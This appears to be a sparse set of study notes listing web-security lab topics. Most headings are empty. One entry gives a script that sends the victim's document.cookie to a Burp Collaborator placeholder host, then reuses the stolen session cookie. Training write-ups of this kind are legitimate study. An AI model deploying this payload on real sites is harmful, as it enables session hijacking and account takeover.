## SQL injection
### Blind SQL injection with out-of-band data exfiltration
1. Exploit server:
```js
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
2. Podnieniamy cookie na zdobyte i wchodzimy na '/my-account`

### SQL injection with filter bypass via XML encoding

## Cross-site scripting
### Exploiting cross-site scripting to steal cookies

## Cross-site request forgery (CSRF)

## Clickjacking

## DOM-based vulnerabilities

## Cross-origin resource sharing (CORS)

## XML external entity (XXE) injection

## Server-side request forgery (SSRF)
### SSRF with blacklist-based input filter
 
## HTTP request smuggling
### Exploiting HTTP request smuggling to capture other users' requests

## OS command injection

## Server-side template injection

## Directory traversal

## Access control vulnerabilities

## Authentication
### Brute-forcing a stay-logged-in cookie

## WebSockets

## Web cache poisoning

## Insecure deserialization

## Information disclosure

## Business logic vulnerabilities

## HTTP Host header attacks

## OAuth authentication
### Forced OAuth profile linking

## File upload vulnerabilities

## JWT

## Essential skills
### Discovering vulnerabilities quickly with targeted scanning

## Prototype pollution
